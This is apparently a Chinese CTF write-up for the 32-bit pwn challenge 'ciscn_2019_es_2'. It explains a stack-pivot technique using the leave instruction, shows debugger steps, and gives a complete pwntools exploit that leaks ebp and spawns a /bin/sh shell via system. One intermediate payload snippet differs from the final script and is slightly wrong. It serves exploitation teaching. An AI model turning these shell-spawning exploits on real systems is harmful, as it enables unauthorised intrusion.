**题目：ciscn_2019_es_2**

## 代码审计

### main()函数

    
    
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      init();
      puts("Welcome, my friend. What's your name?");
      vul();
      return 0;
    }
    

main()函数没啥好看的直接跳过吧 ^o^。

### vul()函数

    
    
    int vul()
    {
      char s[40]; // [esp+0h] [ebp-28h] BYREF  #s在栈里大小0x28
    
      memset(s, 0, 0x20u);
      read(0, s, 0x30u);  #read函数读取0x30大小的数据到s里。
      printf("Hello, %s\n", s);
      read(0, s, 0x30u);
      return printf("Hello, %s\n", s);
    }
    

这里我们发现能够溢出但不完全溢出。: (

## 思路

整理思路：1、存在栈溢出 2、可以尝试栈迁移

Tips：栈迁移通过leave指令改变ebp，esp构造一个新的栈

我们尝试通过栈迁移构造一个新的栈然后把我们的rop链写到新的栈里。

一开始我是想迁移到bss段上但是，bss段不具有可执行权限因此迁移上去无法getshell。

![bss无权限](https://image.3001.net/images/20211112/1636727394_618e7a623d0c5cad9d370.png!small)

换个思路。

Tips：leave指令一般出现在函数执行完结尾的地方

    
    
    leave指令相当于
    mov esp,ebp
    pop ebp
    

开头

![开头](https://image.3001.net/images/20211112/1636727426_618e7a8262e92bc3a604f.png!small)

    
    
    push ebp
    mov ebp,esp
    

leave指令不仅会调整堆栈，还会恢复推入堆栈的RBP EBP BP的先前值。

### vul()函数汇编代码

    
    
    .text:08048595 ; int vul()
    .text:08048595                 public vul
    .text:08048595 vul             proc near               ; CODE XREF: main+26↓p
    .text:08048595
    .text:08048595 s               = byte ptr -28h
    .text:08048595
    .text:08048595 ; __unwind {
    .text:08048595                 push    ebp
    .text:08048596                 mov     ebp, esp
    .text:08048598                 sub     esp, 28h
    .text:0804859B                 sub     esp, 4
    .text:0804859E                 push    20h ; ' '       ; n
    .text:080485A0                 push    0               ; c
    .text:080485A2                 lea     eax, [ebp+s]
    .text:080485A5                 push    eax             ; s
    .text:080485A6                 call    _memset
    .text:080485AB                 add     esp, 10h
    .text:080485AE                 sub     esp, 4
    .text:080485B1                 push    30h ; '0'       ; nbytes
    .text:080485B3                 lea     eax, [ebp+s]
    .text:080485B6                 push    eax             ; buf
    .text:080485B7                 push    0               ; fd
    .text:080485B9                 call    _read
    .text:080485BE                 add     esp, 10h
    .text:080485C1                 sub     esp, 8
    .text:080485C4                 lea     eax, [ebp+s]
    .text:080485C7                 push    eax
    .text:080485C8                 push    offset format   ; "Hello, %s\n"
    .text:080485CD                 call    _printf
    .text:080485D2                 add     esp, 10h
    .text:080485D5                 sub     esp, 4
    .text:080485D8                 push    30h ; '0'       ; nbytes
    .text:080485DA                 lea     eax, [ebp+s]
    .text:080485DD                 push    eax             ; buf
    .text:080485DE                 push    0               ; fd
    .text:080485E0                 call    _read
    .text:080485E5                 add     esp, 10h
    .text:080485E8                 sub     esp, 8
    .text:080485EB                 lea     eax, [ebp+s]
    .text:080485EE                 push    eax
    .text:080485EF                 push    offset format   ; "Hello, %s\n"
    .text:080485F4                 call    _printf
    .text:080485F9                 add     esp, 10h
    .text:080485FC                 nop
    .text:080485FD                 leave
    .text:080485FE                 retn
    .text:080485FE ; } // starts at 8048595
    .text:080485FE vul             endp
    .text:080485FE
    

思路：我们第一遍先泄露ebp的地址。

    
    
    # -*- coding: UTF-8 -*-    #by 小渔xiaoyu
    from pwn import*
    from LibcSearcher import *
    context(os='linux', arch='i386', log_level='debug')
    elf = ELF('./ciscn_2019_es_2')
    sh = elf.process()
    #leak_ebp_addr
    payload = "A"*0x20+"B"*8
    sh.recvuntil("Welcome, my friend. What's your name?\n")
    sh.send(payload)
    sh.recvuntil('BBBBBBBB')
    ebp_addr  = u32(sh.recv(4))
    print 'ebp_addr [+]:',hex(ebp_addr)
    

![泄露ebp地址](https://image.3001.net/images/20211112/1636727447_618e7a976f762494c566e.png!small)

第二遍我们利用要栈迁移通过leave指令改变ebp，esp构造一个新的栈，然后把ROP链写到新的栈里。

此时我们构造exp：

    
    
    payload ="A"*0x4+p32(system_plt)+p32(0)+p32(ebp_addr-0x28)+'/bin/sh'
    payload+=payload.ljust(0x28,'\x00')
    payload+=p32(ebp_addr-0x38)+p32(leave_addr)
    

此时的栈布局大概是这样的。

![栈布局](https://image.3001.net/images/20211112/1636727467_618e7aab5fe94da38cb20.png!small)

我们在`ebp_addr-0x38`这个地址上存放了leave_addr的地址。当程序执行到`ebp_addr-0x38`这里时会ret到leave指令的地址执行leave指令。

### 动态调试

这里动态调试会更清楚一点。

![1](https://image.3001.net/images/20211112/1636727491_618e7ac3cb0631ff6ea20.png!small)

![2](https://image.3001.net/images/20211112/1636727518_618e7adedadd1da83d6dc.png!small)

![3](https://image.3001.net/images/20211112/1636727539_618e7af36d8b7a6fe6e72.png!small)

我们看到我们第二遍的payload打过去此时栈里情况和前面的图是一样的，此时esp还没有向下寻址。

我们继续向下单步调试。

![计算](https://image.3001.net/images/20211112/1636727561_618e7b099131f20c862c1.png!small)

这里我们可以看到我们把`/bin/sh`写到了`ebp_addr-0x28`这个位置。

![计算](https://image.3001.net/images/20211112/1636727581_618e7b1d3e32494fcd211.png!small)

![4](https://image.3001.net/images/20211112/1636727653_618e7b65116de6f7baf25.png!small)

到这里我们看到此时esp寻址到我们payload里面放的`'AAAA' 0xffa8c610`接下来esp继续向下寻址势必要

执行ret指令。在我们payload里ret应该是到system_plt的，我们继续单步运行。

![5](https://image.3001.net/images/20211112/1636727675_618e7b7b4e102095683bc.png!small)

在esp寻址到nop指令的时候我们看看ebp内的参数，我们发现此时栈底存放这参数是`'AAAA'`其次是我们payload里放的leave指令地址。

我们继续单步

![image](https://image.3001.net/images/20211112/1636727685_618e7b85c569d7de00afe.png!small)

很奇怪，`'AAAA'`后面的leave不见了。我们回到leave指令的Tips，

    
    
    leave指令相当于
    mov esp,ebp
    pop ebp
    

实际上这就很好的解释了为什么。我们可以看到执行完leave指令之后原本ebp的值被放到了esp寄存器里，  
而ebp参数被pop弹出那被弹出的就是leave指令的地址，而弹出的地址被弹到了eip寄存器。  
eip寄存器的作用就是读取下一跳地址。  
继续运行程序就会ret到我们payload里面放的leave指令的地址，再执行一边leave指令。  
ok到此正好把leave指令的作用讲了一遍。

![5](https://image.3001.net/images/20211112/1636727776_618e7be0c018dd654154c.png!small)

![6](https://image.3001.net/images/20211112/1636727705_618e7b999c668a1ada07f.png!small)

后面执行完leave指令之后ret到payload里面的system地址。

看这张图就差不多懂了我这里就不在解释了和前面一样。调试到这差不多了。

这道题其实是一道很不错的栈迁移的例题正好拿来做了一遍顺便再巩固一下。

### EXP

贴一下最后的exp：

    
    
    # -*- coding: UTF-8 -*-    #by 小渔xiaoyu
    from pwn import*
    context(os='linux', arch='i386', log_level='debug')
    elf = ELF('./ciscn_2019_es_2')
    sh = elf.process()
    #sh = remote('node4.buuoj.cn',26422)
    system_plt = elf.plt['system']
    leave_addr = 0x08048562
    print(hex(system_plt))
    #leak_ebp_addr
    payload = "A"*0x20+"B"*8
    sh.recvuntil("Welcome, my friend. What's your name?\n")
    sh.send(payload)
    sh.recvuntil('BBBBBBBB')
    ebp_addr  = u32(sh.recv(4))
    print 'ebp_addr [+]:',hex(ebp_addr)
    #getshell
    payload ="A"*0x4+p32(system_plt)+p32(0)+p32(ebp_addr-0x28)+'/bin/sh'
    payload=payload.ljust(0x28,'\x00')
    payload+=p32(ebp_addr-0x38)+p32(leave_addr)
    sh.send(payload)
    sh.interactive()
    

